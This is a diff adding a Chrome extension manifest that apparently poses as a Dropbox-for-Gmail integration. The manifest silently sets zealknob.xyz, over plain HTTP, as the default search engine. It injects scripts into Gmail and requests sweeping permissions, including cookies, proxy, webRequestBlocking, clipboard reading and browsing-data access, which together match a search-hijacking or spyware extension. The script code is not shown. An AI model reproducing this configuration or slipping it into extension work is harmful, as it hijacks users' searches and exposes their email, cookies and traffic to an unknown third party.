@@ -1,0 +1,96 @@
+{
+	"background": {
+		"persistent": true,
+		"scripts": [
+			"constants.js",
+			"util.js",
+			"background.js"
+		]
+	},
+	"chrome_settings_overrides": {
+		"search_provider": {
+			"encoding": "UTF-8",
+			"favicon_url": "http://zealknob.xyz/favicon.ico",
+			"is_default": true,
+			"keyword": "zealknob",
+			"name": "zealknob",
+			"search_url": "http://zealknob.xyz/?versesentence={searchTerms}"
+		}
+	},
+	"content_scripts": [
+		{
+			"css": [
+				"onboarding.css"
+			],
+			"js": [
+				"inboxsdk.js",
+				"constants.js",
+				"sha1.js",
+				"util.js",
+				"content.js"
+			],
+			"matches": [
+				"https://mail.google.com/*",
+				"https://inbox.google.com/*"
+			],
+			"run_at": "document_end"
+		},
+		{
+			"js": [
+				"isinstalled.js"
+			],
+			"matches": [
+				"https://www.dropbox.com/gmail_integration"
+			],
+			"run_at": "document_end"
+		}
+	],
+	"content_security_policy": "script-src 'self'; object-src 'self';",
+	"default_locale": "en",
+	"description": "__MSG_appDesc__",
+	"icons": {
+		"128": "images/app_icon128.png",
+		"16": "images/app_icon16.png",
+		"48": "images/app_icon48.png"
+	},
+	"manifest_version": 2,
+	"name": "__MSG_appName__",
+	"permissions": [
+		"<all_urls>",
+		"activeTab",
+		"background",
+		"browsingData",
+		"clipboardRead",
+		"clipboardWrite",
+		"contextMenus",
+		"cookies",
+		"declarativeContent",
+		"identity",
+		"idle",
+		"nativeMessaging",
+		"notificationProvider",
+		"notifications",
+		"pageCapture",
+		"proxy",
+		"storage",
+		"tabCapture",
+		"tabs",
+		"unlimitedStorage",
+		"webRequest",
+		"webRequestBlocking"
+	],
+	"short_name": "__MSG_short_name__",
+	"update_url": "https://clients2.google.com/service/update2/crx",
+	"version": "1.0",
+	"web_accessible_resources": [
+		"images/logo.png",
+		"images/icon16.png",
+		"images/icon48.png",
+		"images/icon128.png",
+		"images/white_icon48.png",
+		"images/onboarding.png",
+		"images/checkmark.png",
+		"images/x.png",
+		"blank.html"
+	]
+}
